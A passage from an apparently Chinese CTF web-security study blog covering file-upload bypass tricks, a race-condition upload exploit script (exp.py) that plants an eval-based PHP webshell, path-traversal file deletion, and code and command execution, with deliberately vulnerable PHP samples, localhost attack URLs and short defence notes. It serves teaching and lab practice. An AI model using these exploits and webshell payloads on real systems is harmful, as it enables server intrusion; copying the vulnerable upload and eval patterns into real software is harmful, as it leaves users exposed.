class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $filename = basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]).<span class="string">"."</span>.$new_upload_file_ext;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],<span class="string">"uploads/"</span>.$filename))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Upload Success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> name=<span class="string">"upload"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"204800"</span>/&gt;</span><br><span class="line">    请选择要上传的文件：&lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>apache服务器可能做了配置不会解析特殊扩展名<br>使用其他服务器复现(我使用的nginx),上传php4扩展名绕过黑名单<br><code>http://127.0.0.1/uploads/shell.php4</code></p>
+<p>白名单检测:<br>仅允许指定的文件类型上传，比如仅与需上传jpg | gif | doc等类型的文件，其他全部禁止</p>
+<p>绕过方法：</p>
+<ul>
+<li>文件名大小写绕过<ul>
+<li>用像 AsP，pHp 之类的文件名绕过黑名单检测</li>
+</ul>
+</li>
+<li>名单列表绕过<ul>
+<li>用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类</li>
+</ul>
+</li>
+<li>特殊文件名绕过<ul>
+<li>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性</li>
+</ul>
+</li>
+<li>0x00截断<ul>
+<li>文件名后缀就一个%00字节，可以截断某些函数对文件名的判断。在许多语言函数中处理函数中，处理字符串中(php版本需要小于5.3.4,magic_quotes_gpc=Off)</li>
+</ul>
+</li>
+</ul>
+<h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><p>文件头检测:</p>
+<ul>
+<li>JPG: FF D8 FF E0 00 10 4A 46 49 46</li>
+<li>GIF: 47 49 46 38 39 61 (GIF89a)</li>
+<li>PNG: 89 50 4E 47<br>绕过方法:<br>添加头对应的文件头伪造</li>
+</ul>
+<p>文件相关信息检测:</p>
+<ul>
+<li>检查图片大小、尺寸等的信息。<br>绕过方法:<br>将代码注入到正常文件中(比如图片马:copy /b 1.jpg+2.php)</li>
+</ul>
+<h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p>当文件上传到服务器,先暂时保存,在检查是不是符合条件,如果不符合再删掉。<br>利用思路就是我们用多线程不断上传.php文件,在某个没有被删除的时刻如果访问到了.php文件,就生成一个shell,shell就会存到服务器。</p>
+<p>eg:</p>
+<p>competionupload.php(test on php 5.5.38)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'submit'</span>])&#123;</span><br><span class="line">    $allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">    $size = <span class="number">10000000</span>;</span><br><span class="line">    $path = <span class="string">"./uploads/"</span>;</span><br><span class="line">    $filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $newfile = $path.$filename;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        unlink($newfile);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line">    <span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">        unlink($newfile);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> name=<span class="string">"upload"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"204800"</span>/&gt;</span><br><span class="line">    请选择要上传的文件：&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">exp_name = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits,<span class="number">10</span>))</span><br><span class="line">shell_name = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照自己的环境修改url</span></span><br><span class="line">upload_url = <span class="string">'http://127.0.0.1/competionupload.php'</span></span><br><span class="line">exp_url = <span class="string">'http://127.0.0.1/uploads/&#123;&#125;.php'</span>.format(exp_name)</span><br><span class="line">shell_url = <span class="string">'http://127.0.0.1/uploads/&#123;&#125;.php'</span>.format(shell_name)</span><br><span class="line"></span><br><span class="line">exp_content = (<span class="string">'&lt;?php fputs(fopen("&#123;&#125;.php", "w"), '</span></span><br><span class="line">               <span class="string">'\'&lt;?php @eval($_POST["qqq"]) ?&gt;\'); ?&gt;'</span>)</span><br><span class="line">exp_content = exp_content.format(shell_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'[+] upload file...'</span>)</span><br><span class="line">        data = &#123;<span class="string">'submit'</span>:<span class="string">'上传'</span>&#125;</span><br><span class="line">        files = &#123;<span class="string">"file"</span>:(<span class="string">'&#123;&#125;.php'</span>.format(exp_name),exp_content)&#125;</span><br><span class="line">        resp = requests.post(upload_url,files=files,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'[+] get shell file...'</span>)</span><br><span class="line">        requests.get(exp_url)</span><br><span class="line">        resp = requests.get(shell_url)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">'[*] create &#123;&#125;.php success'</span>.format(shell_name))</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 线程数也可以自己修改,我这里只是开太多线程本地服务器扛不住</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            t = threading.Thread(target=get,args=())</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            t = threading.Thread(target=upload,args=())</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">            thread.join()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(str(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>可以参考<a href="http://www.lmxspace.com/2018/06/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ewriteup/" target="_blank" rel="noopener">上面讲了19种情景的bypass方法</a></p>
+<h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>文件删除漏洞出现在有文件管理功能的应用上很多,这些应用一般都有文件上传和读取等功能。漏洞利用原理和文件读取差不多,只是利用函数不一样。一般是因为删除文件的文件名可以用../跳转,或者没有限制当前用户只能删除他该有权限删除的文件。php中这个漏洞函数通常是unlink()</p>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$basedir = <span class="string">'./uploads/'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) &amp;&amp; $_GET[<span class="string">'action'</span>] == <span class="string">'delete'</span>)&#123;</span><br><span class="line">    $filename = <span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>($filename)&#123;</span><br><span class="line">        unlink($basedir.$filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/filedelete.php?action=delete&amp;filename=../../../../../../../test.txt</code></p>
+<h3 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h3><p>通用防范:</p>
+<ul>
+<li>对权限管理要合理,比如用户A上传的文件,不能被同权限的B用户删除。特殊文件操作需要特权用户才能操作,比如后台删除文件的操作,肯定需要限制管理员才能操作。</li>
+<li>有的文件操作不需要直接传入文件名,比如下载文件时,可以将文件名、路径、ID(MD5形式)及文件上传用户存入数据库中,操作时根据文件ID和当前用户名去判断当前用户有没有权限操作改文件。</li>
+<li>避免目录跳转。禁止<code>..</code>、<code>/</code>、<code>\</code>来跳转目录</li>
+</ul>
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>代码执行漏洞指应用程序本身过滤不严,用户可以通过请求将代码注入到应用中执行。这种漏洞如果没有进行特殊过滤,相当于一个web后门的存在。</p>
+<p>php中导致该漏洞的函数:</p>
+<ul>
+<li>eval</li>
+<li>assert</li>
+<li>preg_replace</li>
+<li>call_user_func</li>
+<li>call_user_func_array</li>
+<li>array_map</li>
+<li>php动态函数($a($b))</li>
+<li>…</li>
+</ul>
+<p>eval()和assert()函数导致的代码执行漏洞大多数是因为载入缓存或者模板以及对变量的处理不严格导致,比如直接把一个外部可控的参数拼接到模板里面，然后调用这两个函数去当成php代码执行。</p>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">action_a</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'call action_a method'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">action_b</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'call action_b method'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'m'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'action_'</span>.$a.<span class="string">'();'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/codexec_eval.php?m=b</code></p>
+<p><code>http://127.0.0.1/codexec_eval.php?m=b();phpinfo();//</code></p>
+<p>preg_replace()函数(<strong>php5.5之前可用</strong>)导致代码执行需要存在<code>/e</code>参数，这个函数原本是用来处理字符串的，因此漏洞出现最多的是在对字符串的处理，比如URL、HTML标签及文章内容过滤等地方。</p>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$html_body = <span class="string">'&lt;a &#123;$&#123;phpinfo()&#125;&#125;&gt;&lt;/a&gt;'</span>;</span><br><span class="line">var_dump(preg_replace(<span class="string">"#(&lt;/?)(\w+)([^&gt;]*&gt;)#e"</span>,</span><br><span class="line">              <span class="string">'"\\1".strtoupper("\\2")."\\3"'</span>,$html_body));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/codexec_preg.php</code></p>
+<p>由于php特性的原因，php函数可以直接由字符串拼接，导致动态执行函数。</p>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'a'</span>]($_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/codexec_dynfunc.php?a=assert&amp;b=phpinfo()</code></p>
+<p>还有其他函数，可以自行查阅</p>
+<p>实际环境中可以结合正则表达式使用白名单对参数过滤</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>代码执行是指可以执行代码，命令执行是可以执行系统命令(比如CMD或者BASH命令)。php命令执行是继承webserver用户权限。</p>
+<p>php命令执行函数:</p>
+<ul>
+<li>system</li>
+<li>exec</li>
+<li>shell_exec</li>
+<li>passthru</li>
+<li>pcntl_exec</li>
+<li>popen</li>
+<li>proc_popen</li>
+<li>`</li>
+</ul>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'whoami'</span>);</span><br><span class="line">popen(<span class="string">'whoami &gt;&gt; ./aaa.txt'</span>,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>防范</p>
+<ul>
+<li>使用escapeshellcmd、escapeshellarg防止命令注入</li>
+<li>参数白名单</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>Donate comment here.</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              
+                 <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              
+                 <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/02/08/wust_funnyctf_WriteUp/" rel="next" title="Wust闲得蛋疼春节瞎欢乐赛_官方WriteUp">
+      Wust闲得蛋疼春节瞎欢乐赛_官方WriteUp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#常见套路"><span class="nav-number">1.</span> <span class="nav-text">常见套路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息泄露"><span class="nav-number">2.</span> <span class="nav-text">信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看源代码"><span class="nav-number">2.1.</span> <span class="nav-text">查看源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#robots-txt"><span class="nav-number">2.2.</span> <span class="nav-text">robots.txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注释"><span class="nav-number">2.3.</span> <span class="nav-text">注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#备份文件源码泄漏"><span class="nav-number">2.4.</span> <span class="nav-text">备份文件源码泄漏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#include漏洞"><span class="nav-number">2.5.</span> <span class="nav-text">include漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抓包-HTTP"><span class="nav-number">3.</span> <span class="nav-text">抓包&#x2F;HTTP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET-amp-POST"><span class="nav-number">3.1.</span> <span class="nav-text">GET&amp;POST</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP头部绕过姿势"><span class="nav-number">3.2.</span> <span class="nav-text">HTTP头部绕过姿势</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#源码审计"><span class="nav-number">4.</span> <span class="nav-text">源码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php弱类型"><span class="nav-number">4.1.</span> <span class="nav-text">php弱类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#与"><span class="nav-number">4.1.1.</span> <span class="nav-text">&#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#md5绕过-Hash比较缺陷"><span class="nav-number">4.1.2.</span> <span class="nav-text">md5绕过(Hash比较缺陷)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#json绕过"><span class="nav-number">4.1.3.</span> <span class="nav-text">json绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#array-search-is-array绕过"><span class="nav-number">4.1.4.</span> <span class="nav-text">array_search is_array绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#strcmp漏洞绕过-php-v-lt-5-3"><span class="nav-number">4.1.5.</span> <span class="nav-text">strcmp漏洞绕过 php -v &lt;5.3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#switch绕过"><span class="nav-number">4.1.6.</span> <span class="nav-text">switch绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#is-numeric（）、int-强制类型转换"><span class="nav-number">4.1.7.</span> <span class="nav-text">is_numeric（）、int()强制类型转换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">4.1.8.</span> <span class="nav-text"></span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入"><span class="nav-number">5.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#分类："><span class="nav-number">5.0.1.</span> <span class="nav-text">分类：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#按照参数类型分类"><span class="nav-number">5.0.1.1.</span> <span class="nav-text">按照参数类型分类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#数值型"><span class="nav-number">5.0.1.2.</span> <span class="nav-text">数值型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#字符型"><span class="nav-number">5.0.1.3.</span> <span class="nav-text">字符型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#按数据库返回的结果分类"><span class="nav-number">5.0.1.4.</span> <span class="nav-text">按数据库返回的结果分类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#回显注入"><span class="nav-number">5.0.1.5.</span> <span class="nav-text">回显注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#报错注入"><span class="nav-number">5.0.1.6.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#盲注"><span class="nav-number">5.0.1.7.</span> <span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#其他特殊注入"><span class="nav-number">5.0.1.8.</span> <span class="nav-text">其他特殊注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#宽字节注入"><span class="nav-number">5.0.1.9.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二次注入"><span class="nav-number">5.0.1.10.</span> <span class="nav-text">二次注入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#检测判断sql注入："><span class="nav-number">5.0.2.</span> <span class="nav-text">检测判断sql注入：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断什么类型注入："><span class="nav-number">5.0.3.</span> <span class="nav-text">判断什么类型注入：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库查询版本"><span class="nav-number">5.0.4.</span> <span class="nav-text">数据库查询版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断过滤了哪些字符？"><span class="nav-number">5.0.5.</span> <span class="nav-text">判断过滤了哪些字符？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断字段长度"><span class="nav-number">5.0.6.</span> <span class="nav-text">判断字段长度</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#order-by-数字-可以判断字段的个数"><span class="nav-number">5.0.7.</span> <span class="nav-text">order by 数字 可以判断字段的个数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断字段回显位置"><span class="nav-number">5.0.8.</span> <span class="nav-text">判断字段回显位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断数据库注入"><span class="nav-number">5.0.9.</span> <span class="nav-text">判断数据库注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过登陆验证"><span class="nav-number">5.0.10.</span> <span class="nav-text">绕过登陆验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入常见函数"><span class="nav-number">5.0.11.</span> <span class="nav-text">SQL注入常见函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#联合爆库："><span class="nav-number">5.0.12.</span> <span class="nav-text">联合爆库：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入："><span class="nav-number">5.0.13.</span> <span class="nav-text">报错注入：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bool盲注"><span class="nav-number">5.0.14.</span> <span 